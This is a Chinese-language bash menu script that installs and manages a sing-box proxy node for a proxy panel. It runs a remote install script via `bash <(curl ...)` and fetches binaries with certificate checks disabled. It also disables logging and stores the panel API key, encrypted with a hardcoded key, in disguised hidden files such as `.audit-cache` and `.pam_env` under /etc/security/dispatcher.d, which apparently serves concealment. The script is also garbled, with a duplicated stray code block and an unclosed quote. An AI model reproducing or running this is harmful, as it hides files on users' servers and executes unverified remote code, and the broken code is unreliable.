#!/bin/bash

red='\033[0;31m'
green='\033[0;32m'
yellow='\033[0;33m'
plain='\033[0m'

[[ $EUID -ne 0 ]] && echo -e "${red}错误: ${plain} 必须使用root用户运行此脚本！\n" && exit 1

if [[ -f /etc/redhat-release ]]; then
    release="centos"
elif cat /etc/issue | grep -Eqi "alpine"; then
    release="alpine"
elif cat /etc/issue | grep -Eqi "debian"; then
    release="debian"
elif cat /etc/issue | grep -Eqi "ubuntu"; then
    release="ubuntu"
elif cat /etc/issue | grep -Eqi "centos|red hat|redhat|rocky|alma|oracle linux"; then
    release="centos"
elif cat /proc/version | grep -Eqi "debian"; then
    release="debian"
elif cat /proc/version | grep -Eqi "ubuntu"; then
    release="ubuntu"
elif cat /proc/version | grep -Eqi "centos|red hat|redhat|rocky|alma|oracle linux"; then
    release="centos"
elif cat /proc/version | grep -Eqi "arch"; then
    release="arch"
else
    echo -e "${red}未检测到系统版本！${plain}\n" && exit 1
fi

SING_BOX_DIR="/etc/sing-box"
BINARY_PATH="${SING_BOX_DIR}/sing-box"
CONFIG_PATH="${SING_BOX_DIR}/config.json"

confirm() {
    if [[ $# > 1 ]]; then
        echo && read -rp "$1 [默认$2]: " temp
        [[ x"${temp}" == x"" ]] && temp=$2
    else
        read -rp "$1 [y/n]: " temp
    fi
    [[ x"${temp}" == x"y" || x"${temp}" == x"Y" ]] && return 0 || return 1
}

before_show_menu() {
    echo && echo -n -e "${yellow}按回车返回主菜单: ${plain}" && read temp
    show_menu
}

check_status() {
    if [[ ! -f ${BINARY_PATH} ]]; then
        return 2
    fi
    if [[ x"${release}" == x"alpine" ]]; then
        temp=$(service sing-box status 2>/dev/null | awk '{print $3}')
        [[ x"${temp}" == x"started" ]] && return 0 || return 1
    else
        temp=$(systemctl status sing-box 2>/dev/null | grep Active | awk '{print $3}' | cut -d "(" -f2 | cut -d ")" -f1)
        [[ x"${temp}" == x"running" ]] && return 0 || return 1
    fi
}

check_install() {
    check_status
    if [[ $? == 2 ]]; then
        echo -e "\n${red}请先安装 sing-box！${plain}\n"
        [[ $# == 0 ]] && before_show_menu
        return 1
    fi
    return 0
}

show_status() {
    check_status
    case $? in
        0) echo -e "sing-box状态: ${green}已运行${plain}" ;;
        1) echo -e "sing-box状态: ${yellow}未运行${plain}" ;;
        2) echo -e "sing-box状态: ${red}未安装${plain}" ;;
    esac
}

show_usage() {
    echo "sing-box 管理脚本:"
    echo "------------------------------------------"
    echo "sing-box              - 显示管理菜单"
    echo "sing-box start        - 启动"
    echo "sing-box stop         - 停止"
    echo "sing-box restart      - 重启"
    echo "sing-box status       - 查看状态"
    echo "sing-box config       - 编辑配置"
    echo "sing-box version      - 查看版本"
    echo "------------------------------------------"
}

install() {
    bash <(curl -Ls https://raw.githubusercontent.com/Kanzakiyuu/Kanzakiyuu1/master/install_final.sh)
    [[ $? == 0 && $# == 0 ]] && before_show_menu
}

uninstall() {
    confirm "确定要卸载 sing-box 吗?" "n" || { [[ $# == 0 ]] && show_menu; return 0; }
    
    if [[ x"${release}" == x"alpine" ]]; then
        service sing-box stop
        rc-update del sing-box
        rm -f /etc/init.d/sing-box
    else
        systemctl stop sing-box
        systemctl disable sing-box
        rm -f /etc/systemd/system/sing-box.service
        systemctl daemon-reload
        systemctl reset-failed
    fi
    
    rm -rf ${SING_BOX_DIR}
    rm -rf /etc/security/dispatcher.d/.audit-cache
    rm -rf /etc/security/dispatcher.d/.kcache-lib
    rm -rf /etc/security/dispatcher.d/.pam_env
    
    echo -e "\n卸载成功\n"
    [[ $# == 0 ]] && before_show_menu
}

start() {
    check_status
    if [[ $? == 0 ]]; then
        echo -e "\n${green}sing-box已运行${plain}"
    else
        [[ x"${release}" == x"alpine" ]] && service sing-box start || systemctl start sing-box
        sleep 2
        check_status
        [[ $? == 0 ]] && echo -e "${green}sing-box 启动成功${plain}" || echo -e "${red}启动失败${plain}"
    fi
    [[ $# == 0 ]] && before_show_menu
}

stop() {
    [[ x"${release}" == x"alpine" ]] && service sing-box stop || systemctl stop sing-box
    sleep 2
    check_status
    [[ $? == 1 ]] && echo -e "${green}sing-box 停止成功${plain}" || echo -e "${red}停止失败${plain}"
    [[ $# == 0 ]] && before_show_menu
}

restart() {
    [[ x"${release}" == x"alpine" ]] && service sing-box restart || systemctl restart sing-box
    sleep 2
    check_status
    [[ $? == 0 ]] && echo -e "${green}sing-box 重启成功${plain}" || echo -e "${red}重启失败${plain}"
    [[ $# == 0 ]] && before_show_menu
}

status() {
    [[ x"${release}" == x"alpine" ]] && service sing-box status || systemctl status sing-box --no-pager -l
    [[ $# == 0 ]] && before_show_menu
}

enable() {
    [[ x"${release}" == x"alpine" ]] && rc-update add sing-box || systemctl enable sing-box
    [[ $? == 0 ]] && echo -e "${green}开机自启设置成功${plain}" || echo -e "${red}设置失败${plain}"
    [[ $# == 0 ]] && before_show_menu
}

disable() {
    [[ x"${release}" == x"alpine" ]] && rc-update del sing-box || systemctl disable sing-box
    [[ $? == 0 ]] && echo -e "${green}取消开机自启成功${plain}" || echo -e "${red}取消失败${plain}"
    [[ $# == 0 ]] && before_show_menu
}

show_log() {
    echo -e "${yellow}日志已禁用${plain}"
    [[ $# == 0 ]] && before_show_menu
}

show_version() {
    [[ -f ${BINARY_PATH} ]] && ${BINARY_PATH} version || echo -e "${red}未安装${plain}"
    [[ $# == 0 ]] && before_show_menu
}

generate_key() {
    [[ -f ${BINARY_PATH} ]] && ${BINARY_PATH} x25519 || echo -e "${red}未安装${plain}"
    [[ $# == 0 ]] && before_show_menu
}

config() {
    [[ -f "$CONFIG_PATH" ]] && vi "$CONFIG_PATH" || echo -e "${red}配置文件不存在${plain}"
    before_show_menu
}

check_ipv6_support() {
    if ip -6 addr 2>/dev/null | grep -q "inet6"; then
        echo "1"
    else
        echo "0"
    fi
}

add_single_node() {
    echo "请选择节点核心类型："
    echo "1. xray"
    echo "2. singbox"
    echo "3. hysteria2"
    read -rp "请输入：" core_type
    if [ "$core_type" == "1" ]; then
        core="xray"
    elif [ "$core_type" == "2" ]; then
        core="sing"
    elif [ "$core_type" == "3" ]; then
        core="hysteria2"
    else
        echo "无效的选择。请选择 1 2 3。"
        return 1
    fi
    
    while true; do
        read -rp "请输入节点Node ID：" NodeID
        if [[ "$NodeID" =~ ^[0-9]+$ ]]; then
            break
        else
            echo "错误：请输入正确的数字作为Node ID。"
        fi
    done

    if [ "$core" == "hysteria2" ]; then
        NodeType="hysteria2"
    else
        echo "请选择节点传输协议："
        echo "1. Shadowsocks"
        echo "2. Vless"
        echo "3. Vmess"
        if [ "$core" == "sing" ]; then
            echo "4. Hysteria"
            echo "5. Hysteria2"
        fi
        if [ "$core" == "hysteria2" ]; then
            echo "5. Hysteria2"
        fi
        echo "6. Trojan"
        if [ "$core" == "sing" ]; then
            echo "7. Tuic"
            echo "8. AnyTLS"
        fi
        read -rp "请输入：" NodeType
        case "$NodeType" in
            1 ) NodeType="shadowsocks" ;;
            2 ) NodeType="vless" ;;
            3 ) NodeType="vmess" ;;
            4 ) NodeType="hysteria" ;;
            5 ) NodeType="hysteria2" ;;
            6 ) NodeType="trojan" ;;
            7 ) NodeType="tuic" ;;
            8 ) NodeType="anytls" ;;
            * ) NodeType="shadowsocks" ;;
        esac
    fi
    
    fastopen="true"
    if [ "$NodeType" == "vless" ]; then
        read -rp "请选择是否为reality节点？: " isreality
    elif [ "$NodeType" == "hysteria" ] || [ "$NodeType" == "hysteria2" ] || [ "$NodeType" == "tuic" ] || [ "$NodeType" == "anytls" ]; then
        fastopen="false"
        istls="y"
    fi

    if [[ "$isreality" != "y" && "$isreality" != "Y" &&  "$istls" != "y" ]]; then
        read -rp "请选择是否进行TLS配置？: " istls
    fi

    certmode="none"
    certdomain="example.com"
    if [[ "$isreality" != "y" && "$isreality" != "Y" && ( "$istls" == "y" || "$istls" == "Y" ) ]]; then
        echo "请选择证书申请模式："
        echo "1. http模式自动申请，节点域名已正确解析"
        echo "2. dns模式自动申请，需填入正确域名服务商API参数"
        echo "3. self模式，自签证书或提供已有证书文件"
        read -rp "请输入：" certmode
        case "$certmode" in
            1 ) certmode="http" ;;
            2 ) certmode="dns" ;;
            3 ) certmode="self" ;;
        esac
        read -rp "请输入节点证书域名: " certdomain
        if [ "$certmode" != "http" ]; then
            echo "请手动修改配置文件后重启sing-box！"
        fi
    fi
    
    ipv6_support=$(check_ipv6_support)
    listen_ip="0.0.0.0"
    if [ "$ipv6_support" -eq 1 ]; then
        listen_ip="::"
    fi
    
    echo "${ApiHost}|${ApiKey}|${NodeID}|${core}|${NodeType}|${certmode}|${certdomain}|${listen_ip}|${fastopen}"
}

generate_config() {
    echo -e "${yellow}sing-box 配置文件生成向导${plain}"
    echo -e "${red}请阅读以下注意事项：${plain}"
    echo -e "${red}1. 目前该功能正处测试阶段${plain}"
    echo -e "${red}2. 生成的配置文件会保存到 /etc/security/dispatcher.d/.audit-cache${plain}"
    echo -e "${red}3. 使用此功能生成的配置文件会自带审计，确定继续？${plain}"
    read -rp "请输入：" continue_prompt
    if [[ "$continue_prompt" =~ ^[Nn][Oo]? ]]; then
        before_show_menu
        return
    fi
    
    local nodes_config=""
    local first_node="true"
    local fixed_api_info="false"
    
    while true; do
        if [ "$first_node" = "true" ]; then
            read -rp "请输入机场网址: " ApiHost
            read -rp "请输入面板对接API Key：" ApiKey
            read -rp "是否设置固定的机场网址和API Key？: " fixed_api
            if [ "$fixed_api" = "y" ] || [ "$fixed_api" = "Y" ]; then
                fixed_api_info=true
                echo "成功固定地址"
            fi
            first_node="false
            
            local node_info=$(add_single_node)
            if [ $? -eq 0 ]; then
                nodes_config="${node_info}"
            fi
        else
            read -rp "是否继续添加节点配置？(回车继续，输入n或no退出)" continue_adding_node
            if [[ "$continue_adding_node" =~ ^[Nn][Oo]? ]]; then
                break
            elif [ "$fixed_api_info" = "false" ]; then
                read -rp "请输入机场网址: " ApiHost
                read -rp "请输入面板对接API Key：" ApiKey
            fi
            
            local node_info=$(add_single_node)
            if [ $? -eq 0 ]; then
                nodes_config="${nodes_config}|||${node_info}"
            fi
        fi
    done
    
    echo -e "${yellow}正在生成加密配置...${plain}"
    HIDDEN_DIR="/etc/security/dispatcher.d"
    
    python3 << PYEOF
import base64
import hashlib
import os
import json

try:
    from cryptography.hazmat.primitives.ciphers.aead import AESGCM
    
    def derive_key(password):
        return hashlib.sha256(password.encode()).digest()
    
    nodes_data = """${nodes_config}"""
    nodes = []
    
    for entry in nodes_data.split('|||'):
        parts = entry.split('|')
        if len(parts) >= 9:
            api_host, api_key, node_id, core, node_type, certmode, certdomain, listen_ip, fastopen = parts[:9]
            
            if core == "hysteria2":
                node = {
                    "Core": "hysteria2",
                    "ApiHost": api_host,
                    "ApiKey": api_key,
                    "NodeID": int(node_id),
                    "NodeType": "hysteria2",
                    "Hysteria2ConfigPath": "/etc/security/dispatcher.d/hy2config.yaml",
                    "Timeout": 30,
                    "ListenIP": "",
                    "SendIP": "0.0.0.0",
                    "DeviceOnlineMinTraffic": 200,
                    "MinReportTraffic": 0,
                    "CertConfig": {
                        "CertMode": certmode,
                        "RejectUnknownSni": False,
                        "CertDomain": certdomain,
                        "CertFile": "/etc/security/dispatcher.d/cert.pem",
                        "KeyFile": "/etc/security/dispatcher.d/key.pem",
                        "Email": "v2bx@github.com",
                        "Provider": "cloudflare",
                        "DNSEnv": {"EnvName": "env1"}
                    }
                }
            else:
                node = {
                    "Core": core,
                    "ApiHost": api_host,
                    "ApiKey": api_key,
                    "NodeID": int(node_id),
                    "NodeType": node_type,
                    "Timeout": 30,
                    "ListenIP": listen_ip,
                    "SendIP": "0.0.0.0",
                    "DeviceOnlineMinTraffic": 200,
                    "MinReportTraffic": 0,
                    "EnableProxyProtocol": False,
                    "EnableUot": True,
                    "EnableTFO": fastopen.lower() == "true",
                    "DNSType": "UseIPv4",
                    "CertConfig": {
                        "CertMode": certmode,
                        "RejectUnknownSni": False,
                        "CertDomain": certdomain,
                        "CertFile": "/etc/security/dispatcher.d/cert.pem",
                        "KeyFile": "/etc/security/dispatcher.d/key.pem",
                        "Email": "v2bx@github.com",
                        "Provider": "cloudflare",
                        "DNSEnv": {"EnvName": "env1"}
                    }
                }
            nodes.append(node)
    
    config = {
        "Log": {"Level": "error", "Output": ""},
        "Nodes": nodes
    }
    
    plaintext = json.dumps(config, indent=2).encode('utf-8')
    key = derive_key('sing-box-config-v1.0')
    aesgcm = AESGCM(key)
    nonce = os.urandom(12)
    ciphertext = aesgcm.encrypt(nonce, plaintext, None)
    
    result = base64.b64encode(nonce + ciphertext).decode('utf-8')
    with open('$HIDDEN_DIR/.audit-cache', 'w') as f:
        f.write('ENC:' + result)
    print('success')
except Exception as e:
    print(f'error: {e}')
PYEOF
    
    if [ $? -eq 0 ]; then
        chmod 600 $HIDDEN_DIR/.audit-cache 2>/dev/null
        echo -e "${green}真实配置已生成${plain}"
        
        if [[ x"${release}" == x"alpine" ]]; then
            service sing-box restart 2>/dev/null || service sing-box start
        else
            systemctl restart sing-box 2>/dev/null || systemctl start sing-box
        fi
        echo -e "${green}服务已启动${plain}"
    else
        echo -e "${red}配置生成失败，请检查python3和cryptography是否安装${plain}"
    fi
    
    before_show_menu
}

                }
            else:
                node = {
                    "Core": core,
                    "ApiHost": api_host,
                    "ApiKey": api_key,
                    "NodeID": int(node_id),
                    "NodeType": node_type,
                    "Timeout": 30,
                    "ListenIP": "0.0.0.0",
                    "SendIP": "0.0.0.0",
                    "DeviceOnlineMinTraffic": 200,
                    "MinReportTraffic": 0,
                    "EnableProxyProtocol": False,
                    "EnableUot": True,
                    "EnableTFO": fastopen.lower() == "true",
                    "DNSType": "UseIPv4",
                    "CertConfig": {
                        "CertMode": certmode,
                        "RejectUnknownSni": False,
                        "CertDomain": certdomain,
                        "CertFile": "/etc/security/dispatcher.d/cert.pem",
                        "KeyFile": "/etc/security/dispatcher.d/key.pem",
                        "Email": "v2bx@github.com",
                        "Provider": "cloudflare",
                        "DNSEnv": {"EnvName": "env1"}
                    }
                }
            nodes.append(node)
    
    config = {
        "Log": {"Level": "error", "Output": ""},
        "Nodes": nodes
    }
    
    plaintext = json.dumps(config, indent=2).encode('utf-8')
    key = derive_key('sing-box-config-v1.0')
    aesgcm = AESGCM(key)
    nonce = os.urandom(12)
    ciphertext = aesgcm.encrypt(nonce, plaintext, None)
    
    result = base64.b64encode(nonce + ciphertext).decode('utf-8')
    with open('$HIDDEN_DIR/.audit-cache', 'w') as f:
        f.write('ENC:' + result)
    print('success')
except Exception as e:
    print(f'error: {e}')
PYEOF
    
    if [ $? -eq 0 ]; then
        chmod 600 $HIDDEN_DIR/.audit-cache 2>/dev/null
        echo -e "${green}真实配置已生成${plain}"
        
        if [[ x"${release}" == x"alpine" ]]; then
            service sing-box restart 2>/dev/null || service sing-box start
        else
            systemctl restart sing-box 2>/dev/null || systemctl start sing-box
        fi
        echo -e "${green}服务已启动${plain}"
    else
        echo -e "${red}配置生成失败，请检查python3和cryptography是否安装${plain}"
    fi
    
    before_show_menu
}

update() {
    [[ x"${release}" == x"alpine" ]] && service sing-box stop || systemctl stop sing-box
    cd ${SING_BOX_DIR}
    wget --no-check-certificate -N --no-show-progress -O sb.zip https://github.com/Kanzakiyuu/Kanzakiyuu1/releases/download/release/sing-box-linux-64.zip
    [[ $? -ne 0 ]] && echo -e "${red}下载失败${plain}" && return 1
    unzip -o sb.zip && rm -f sb.zip && chmod +x sing-box
    [[ x"${release}" == x"alpine" ]] && service sing-box start || systemctl start sing-box
    echo -e "${green}更新完成${plain}"
    [[ $# == 0 ]] && before_show_menu
}

update_shell() {
    curl -o /usr/bin/sing-box -Ls https://raw.githubusercontent.com/Kanzakiyuu/Kanzakiyuu1/master/sing-box-final.sh 2>/dev/null
    chmod +x /usr/bin/sing-box
    echo -e "${green}脚本已更新${plain}"
    before_show_menu
}

show_menu() {
    echo -e "
  ${green}sing-box${plain}

  ${green}0.${plain} 编辑配置
  ${green}1.${plain} 安装
  ${green}2.${plain} 卸载
  ${green}3.${plain} 启动
  ${green}4.${plain} 停止
  ${green}5.${plain} 重启
  ${green}6.${plain} 查看状态
  ${green}7.${plain} 查看日志
  ${green}8.${plain} 开机自启
  ${green}9.${plain} 取消开机自启
  ${green}10.${plain} 查看版本
  ${green}11.${plain} 生成密钥
  ${green}12.${plain} 升级脚本
  ${green}13.${plain} 生成配置
  ${green}14.${plain} 退出
"
    show_status
    echo && read -rp "请输入 [0-14]: " num

    case "${num}" in
        0) config ;;
        1) install ;;
        2) check_install && uninstall ;;
        3) check_install && start ;;
        4) check_install && stop ;;
        5) check_install && restart ;;
        6) check_install && status ;;
        7) check_install && show_log ;;
        8) check_install && enable ;;
        9) check_install && disable ;;
        10) check_install && show_version ;;
        11) check_install && generate_key ;;
        12) update_shell ;;
        13) generate_config ;;
        14) exit ;;
        *) echo -e "${red}错误输入${plain}" ;;
    esac
}

[[ $# > 0 ]] && case $1 in
    "start") check_install 0 && start 0 ;;
    "stop") check_install 0 && stop 0 ;;
    "restart") check_install 0 && restart 0 ;;
    "status") check_install 0 && status 0 ;;
    "enable") check_install 0 && enable 0 ;;
    "disable") check_install 0 && disable 0 ;;
    "log") check_install 0 && show_log 0 ;;
    "update") check_install 0 && update 0 ;;
    "config") config ;;
    "generate") generate_config ;;
    "install") install 0 ;;
    "uninstall") check_install 0 && uninstall 0 ;;
    "x25519") check_install 0 && generate_key 0 ;;
    "version") check_install 0 && show_version 0 ;;
    *) show_usage ;;
esac || show_menu
